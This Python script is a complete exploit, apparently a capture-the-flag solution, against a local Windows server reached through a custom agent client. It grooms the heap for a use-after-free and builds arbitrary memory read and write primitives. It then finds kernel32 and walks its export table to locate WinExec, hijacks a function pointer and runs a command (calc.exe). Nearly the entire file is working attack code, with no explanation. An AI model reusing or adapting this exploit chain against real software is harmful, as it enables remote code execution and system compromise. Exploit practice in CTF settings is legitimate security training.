from my_agent import *
import logging
import struct

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.DEBUG, format='%(message)s')

STRUCT_OFFSET = 0x481c
TEXT_SECTION_OFFSET = 0x1000
GET_LAST_ERROR_IMPORT_OFFSET = 0x5000
GET_LAST_ERROR_KERNEL32_OFFSET = 0x14671

def craft_shellcode(address, newaddr):
    addr = struct.pack("<I", address + 4)
    newaddr = struct.pack("<I", newaddr)
    shellcode = (addr + newaddr).ljust(64, b"\x00")
    return shellcode

class MaliciousAgent(object):
    def __init__(self):
        logger.info("[+] Creating malicious agent")
        self.reconnect()

    def reconnect(self):
        self.agent = pythonAgent(("127.0.0.1", 333))
        self.agent.connect(b"a"*24)

    def free(self):
        logger.info("[+] Freeing")
        self.agent.put_new_name(b"b"*100)

    def is_controlling_conn(self, victim):
        name = self.agent.read_name()[1]
        addr = struct.unpack("<I", name[:4])[0]

        if name != b"a"*24 and addr != 0 and addr != 1:
            self.struct_addr = addr
            return True
        else:
            self.reconnect()

        
        return False

    def close(self):
        self.agent.close()

    def create_controlled_connection(self):
        attempts = 0

        logger.info("[+] Will now continously free and allocate new connections until one lands on our freed address")

        while attempts < 1000:
            attempts += 1

            self.agent.put_new_name(b"a"*24)
            self.free()

            self.victim = pythonAgent(("127.0.0.1", 333))
            self.victim.connect(b"a"*64)

            if self.is_controlling_conn(self.victim):
                logger.info("[+] Attempt {} succeeded!".format(attempts))
                break

            logger.info("[+] Attempt {} failed".format(attempts))

    def find_kernel32_address(self):
        logger.info("[+] Now performing some rough calculations to find kernel32 load address")

        base_addr = self.struct_addr - STRUCT_OFFSET - TEXT_SECTION_OFFSET
        
        # Doing some VERY rough calculations here...
        rough_kernel32_base_addr = struct.unpack("<I", self.read_from_address(base_addr + GET_LAST_ERROR_IMPORT_OFFSET, 4))[0] - GET_LAST_ERROR_KERNEL32_OFFSET + 4 * 1000
        self.kernel32_addr = (rough_kernel32_base_addr >> 16) << 16

        return self.kernel32_addr

    def get_function_address(self, func_name):
        logger.info("[+] Looking for function '{}'...".format(func_name.decode("utf8")))

        pe_sig_rva = struct.unpack("<I", self.read_from_address(self.kernel32_addr + 0x3c, 4))[0]
        export_table_rva = struct.unpack("<I", self.read_from_address(self.kernel32_addr + pe_sig_rva + 0x78, 4))[0]
        num_of_functions = struct.unpack("<I", self.read_from_address(self.kernel32_addr + export_table_rva + 0x14, 4))[0]
        address_table_rva = struct.unpack("<I", self.read_from_address(self.kernel32_addr + export_table_rva + 0x1c, 4))[0]
        name_table_rva = struct.unpack("<I", self.read_from_address(self.kernel32_addr + export_table_rva + 0x20, 4))[0]
        ordinal_table_rva = struct.unpack("<I", self.read_from_address(self.kernel32_addr + export_table_rva + 0x24, 4))[0]

        for x in range(self.kernel32_addr + name_table_rva, self.kernel32_addr + name_table_rva + num_of_functions*4, 4):
            name_address = struct.unpack("<I", self.read_from_address(x, 4))[0]
            name = self.read_from_address(self.kernel32_addr + name_address, 64)
            name = name[:name.find(b"\x00")]
            if func_name == name:
                func_index = int((x - self.kernel32_addr - name_table_rva)/4)
                break

        func_ordinal = struct.unpack("<H", self.read_from_address(self.kernel32_addr + ordinal_table_rva + 2*func_index, 2))[0]

        func_address = struct.unpack("<I", self.read_from_address(self.kernel32_addr + address_table_rva + 4*func_ordinal, 4))[0]

        logger.info("[+] Found function at address: {}".format(hex(func_address + self.kernel32_addr)))

        return func_address + self.kernel32_addr

    def get_victim_obj(self):
        return self.agent.read_name()[1]

    def set_victim_obj(self, obj):
        self.agent.put_new_name(obj)

    def get_victim_user_address(self):
        victim_obj = self.get_victim_obj()
        return struct.unpack("<I", victim_obj[20:])[0]

    def set_victim_user_address(self, address):
        victim_obj = self.get_victim_obj()
        new_victim_obj = victim_obj[:20] + struct.pack("<I", address) 

        self.set_victim_obj(new_victim_obj)

    def read_from_stack(self):
        victim_obj = self.get_victim_obj()
        new_victim_obj = victim_obj[:16] + struct.pack("<I", 2000) + victim_obj[20:]
        self.set_victim_obj(new_victim_obj)
        return self.victim.read_name()[1]

    def _write_to_address(self, address, data):
        assert len(data) <= 64, "Can only write up to 64 bytes at a time"
        self.set_victim_user_address(address)
        self.victim.put_new_name(data)

    def _read_from_address(self, address, amount=64):
        assert amount <= 64, "Can only read up to 64 bytes at a time"
        self.set_victim_user_address(address)
        return self.victim.read_name()[1][:amount]

    def read_from_address(self, address, amount=64):
        output = b""

        try:
            for x in range(0, amount, 64):
                output += self._read_from_address(address + x, 64)
        except:
            print("Error: server probably crashed :(")

        return output[:amount]

    def write_to_address(self, address, data):
        assert len(data) % 64 == 0
        for x in range(0, len(data), 64):
            self._write_to_address(address + x, data[x: x+64])

    def run_address(self, address):
        victim_obj = self.get_victim_obj()
        victim_user_addr = self.get_victim_user_address()

        new_victim_obj = victim_obj[20:] + victim_obj[4:]

        self.victim.put_new_name(craft_shellcode(victim_user_addr, address))

        self.set_victim_obj(new_victim_obj)

        self.victim.send_message_to_server(b"test")

    def make_name_point_to_runnable_address(self, address):
        logger.info("[+] Writing new function pointer struct to heap and making one of the functions point to our address")

        victim_user_addr = self.get_victim_user_address()

        function_pointer_struct = self.read_from_address(self.struct_addr, 0x24)
        new_function_pointer_struct = function_pointer_struct[:16] + struct.pack("<I", address) + function_pointer_struct[20:]

        self.victim.put_new_name(new_function_pointer_struct)

        return self.get_victim_user_address()

    def jump_to_shellcode(self, shellcode_addr):
        logger.info("[+] Triggering a jump to our shellcode")

        victim_obj = self.get_victim_obj()
        new_victim_obj = struct.pack("<I", shellcode_addr) + victim_obj[4:]

        self.set_victim_obj(new_victim_obj)

        logger.info("[+] Executing!")

        self.victim.send_message_to_server((b"calc.exe").ljust(10, b"\x00"))

    def get_flag(self):
        victim_obj = self.get_victim_obj()
        new_victim_obj = victim_obj[:12] + struct.pack("<I", 1) + victim_obj[16:]
        self.set_victim_obj(new_victim_obj)
        return self.victim.not_used1()


if __name__ == "__main__":
    m = MaliciousAgent()
    m.create_controlled_connection()

    m.find_kernel32_address()

    winexec_address = m.get_function_address(b"WinExec")

    shellcode_addr = m.make_name_point_to_runnable_address(winexec_address)

    m.jump_to_shellcode(shellcode_addr)




            
